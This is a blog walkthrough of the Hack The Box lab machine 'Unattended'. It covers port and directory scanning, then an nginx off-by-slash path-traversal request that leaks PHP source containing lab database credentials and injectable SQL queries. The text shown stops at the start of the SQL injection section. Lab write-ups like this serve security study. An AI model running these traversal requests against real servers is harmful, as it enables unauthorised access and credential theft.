<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Unattended - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Unattended from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Unattended">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/unattended/">


  <meta property="og:description" content="My write-up / walkthrough for Unattended from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Unattended">
  <meta name="twitter:description" content="My write-up / walkthrough for Unattended from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/unattended/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-08-24T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/unattended/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Unattended">
    <meta itemprop="description" content="Hack The Box - Unattended">
    <meta itemprop="datePublished" content="2019-08-24T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/unattended/" class="u-url" itemprop="url">Hack The Box - Unattended
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-08-24T07:00:00+02:00">August 24, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          34 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---unattended">Hack The Box - Unattended</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#web-enumeration">Web Enumeration</a></li>
<li><a href="#nginx-off-by-slash">Nginx off-by-slash</a></li>
<li><a href="#sqli">SQLI</a></li>
<li><a href="#sqli-to-lfi">SQLI to LFI</a></li>
<li><a href="#lfi-to-rce">LFI to RCE</a></li>
<li><a href="#shell-as-guly-user-flag">Shell as guly, User Flag</a></li>
<li><a href="#initrd-root-flag">initrd, Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---unattended">Hack The Box - Unattended</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Unattended retired and here’s my write-up about it. Personally I think this box should have been rated as hard not medium, it really had a lot of stuff that were hard to find and exploit. There was an interesting <code class="language-plaintext highlighter-rouge">SQL</code> injection vulnerability that could be escalated to local file inclusion then to remote code execution and that’s my favorite part about this box. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.126</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">unattended.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/unattended/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC unattended.htb</code>
<br><img src="/images/hackthebox/unattended/1.png" alt="" class="align-center"><br><br>
Only <code class="language-plaintext highlighter-rouge">http</code> and <code class="language-plaintext highlighter-rouge">https</code>, and surprisingly no <code class="language-plaintext highlighter-rouge">ssh</code>. Also the <code class="language-plaintext highlighter-rouge">ssl</code> certificate from the <code class="language-plaintext highlighter-rouge">https</code> port tells us that the common name is <code class="language-plaintext highlighter-rouge">www.nestedflanders.htb</code> so I added that to my hosts file :
<br><img src="/images/hackthebox/unattended/2.png" alt="" class="align-center"><br><br></p>

<h2 id="web-enumeration">Web Enumeration</h2>
<p>Checking <code class="language-plaintext highlighter-rouge">unattended.htb</code> on both 80 and 443 gives us a blank page :
<br><img src="/images/hackthebox/unattended/3.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/unattended/4.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">http://www.nestedflanders.htb</code> responds with a redirection to <code class="language-plaintext highlighter-rouge">https://www.nestedflanders.htb</code> which has the default Apache page :
<br><img src="/images/hackthebox/unattended/5.png" alt="" class="align-center"><br><br>
I used <code class="language-plaintext highlighter-rouge">wfuzz</code> to enumerate sub directories and it was weird to see both <code class="language-plaintext highlighter-rouge">index.php</code> and <code class="language-plaintext highlighter-rouge">index.html</code> with different content :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# wfuzz --hc 404 -c -u https://www.nestedflanders.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://www.nestedflanders.htb/FUZZ
Total requests: 4614

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200    368 L      933 W        10701 Ch        ""
000011:  C=403     11 L       32 W          290 Ch        ".hta"
000012:  C=403     11 L       32 W          295 Ch        ".htaccess"
000013:  C=403     11 L       32 W          295 Ch        ".htpasswd"
001241:  C=301      7 L       12 W          185 Ch        "dev"
002021:  C=200     48 L      124 W         1244 Ch        "index.php"
002020:  C=200    368 L      933 W        10701 Ch        "index.html"
003588:  C=200     93 L      282 W         5086 Ch        "server-status"
</code></pre></div></div>
<p>Also there was a sub directory called <code class="language-plaintext highlighter-rouge">/dev</code>.<br>
<code class="language-plaintext highlighter-rouge">/dev</code> :
<br><img src="/images/hackthebox/unattended/6.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">/index.html</code> :
<br><img src="/images/hackthebox/unattended/7.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">/index.php</code>
<br><img src="/images/hackthebox/unattended/8.png" alt="" class="align-center"><br><br></p>

<h2 id="nginx-off-by-slash">Nginx off-by-slash</h2>
<p>When I checked <a href="https://www.wappalyzer.com/" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">wappalyzer</code></a> results I saw that it identified the web server as <code class="language-plaintext highlighter-rouge">nginx</code> and that was weird because we saw Apache’s default page. Also when I went to <code class="language-plaintext highlighter-rouge">https://www.nestedflanders.htb/dev</code> I got a redirection to <code class="language-plaintext highlighter-rouge">https://www.nestedflanders.htb/dev/</code> (It added a slash <code class="language-plaintext highlighter-rouge">/</code>).<br></p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;title&gt;</span>301 Moved Permanently<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"white"</span><span class="nt">&gt;</span>
<span class="nt">&lt;center&gt;&lt;h1&gt;</span>301 Moved Permanently<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;</span>nginx/1.10.3<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev/
dev site has been moved to his own server
</code></pre></div></div>
<p>As demonstrated in <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener noreferrer">this document</a> there can be a vulnerability because of this. I gave it a try by adding <code class="language-plaintext highlighter-rouge">..</code> after <code class="language-plaintext highlighter-rouge">dev</code>:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;title&gt;</span>403 Forbidden<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"white"</span><span class="nt">&gt;</span>
<span class="nt">&lt;center&gt;&lt;h1&gt;</span>403 Forbidden<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;</span>nginx/1.10.3<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">403</code> maybe because we are out of  <code class="language-plaintext highlighter-rouge">html</code> directory, I added <code class="language-plaintext highlighter-rouge">/html/index.php</code> and I successfully got the source of the index page :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;title&gt;</span>301 Moved Permanently<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"white"</span><span class="nt">&gt;</span>
<span class="nt">&lt;center&gt;&lt;h1&gt;</span>301 Moved Permanently<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;</span>nginx/1.10.3<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/index.php
<span class="cp">&lt;?php</span>
<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"nestedflanders"</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"1036913cf7d38d4ea4f79b050f171e9fbf3f5e"</span><span class="p">;</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"neddy"</span><span class="p">;</span>
<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
<span class="nv">$debug</span> <span class="o">=</span> <span class="kc">False</span><span class="p">;</span>

<span class="k">include</span> <span class="s2">"6fb17817efb4131ae4ae1acae0f7fd48.php"</span><span class="p">;</span>

<span class="k">function</span> <span class="n">getTplFromID</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
	<span class="nv">$valid_ids</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mi">465</span><span class="p">,</span><span class="mi">587</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'id'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]),</span><span class="nv">$valid_ids</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '"</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '25'"</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sqltpl: </span><span class="nv">$sql</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span> 
	
	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
		<span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nv">$ret</span> <span class="o">=</span> <span class="s1">'main'</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"rettpl: </span><span class="nv">$ret</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
	<span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">getPathFromTpl</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$tpl</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
	<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT path from filepath where name = '"</span><span class="mf">.</span><span class="nv">$tpl</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sqlpath: </span><span class="nv">$sql</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
			<span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"retpath: </span><span class="nv">$ret</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
	<span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$tpl</span> <span class="o">=</span> <span class="nf">getTplFromID</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
<span class="nv">$inc</span> <span class="o">=</span> <span class="nf">getPathFromTpl</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$tpl</span><span class="p">);</span>
<span class="cp">?&gt;</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>Ne(ste)d Flanders<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"bootstrap.min.css"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
  <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;h1&gt;</span>Ne(ste)d Flanders' Portfolio<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">center</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
<span class="cp">&lt;?php</span>

<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '0' order by i.id"</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sql: </span><span class="nv">$sql</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>

<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
		<span class="c1">//if ($debug) { echo "rowid: ".$row['id']."\n"; } // breaks layout</span>
		<span class="k">echo</span> <span class="s1">'&lt;div class="col-md-2"&gt;&lt;a href="index.php?id='</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'" target="maifreim"&gt;'</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'&lt;/a&gt;&lt;/div&gt;'</span><span class="p">;</span>
		<span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?id=25"</span><span class="nt">&gt;</span>main<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?id=465"</span><span class="nt">&gt;</span>about<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?id=587"</span><span class="nt">&gt;</span>contact<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
	<span class="cp">&lt;?php</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>


<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
<span class="c">&lt;!-- &lt;div align="center"&gt; --&gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">include</span><span class="p">(</span><span class="s2">"</span><span class="nv">$inc</span><span class="s2">"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
<span class="c">&lt;!-- &lt;/div&gt; --&gt;</span>

<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"include </span><span class="nv">$inc</span><span class="s2">;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span> <span class="cp">?&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

<span class="cp">&lt;?php</span>
<span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h2 id="sqli">SQLI</h2>
<p>By looking at the <code class="language-plaintext highlighter-rouge">php</code> code we can see database credentials :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"nestedflanders"</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"1036913cf7d38d4ea4f79b050f171e9fbf3f5e"</span><span class="p">;</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"neddy"</span><span class="p">;</span>
</code></pre></div></div>
<p>Those can be helpful later.<br>
Another thing I noticed was this include :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span> <span class="s2">"6fb17817efb4131ae4ae1acae0f7fd48.php"</span><span class="p">;</span>
</code></pre></div></div>
<p>I downloaded that page but it had nothing interesting :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/6fb17817efb4131ae4ae1acae0f7fd48.php
<span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_name'</span><span class="p">])){</span>
        <span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_name'</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$_COOKIE</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/* removed everything because of undergoing investigation, please check dev and staging */</span>
</code></pre></div></div>
<p>We can also see this :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$valid_ids</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mi">465</span><span class="p">,</span><span class="mi">587</span><span class="p">);</span>
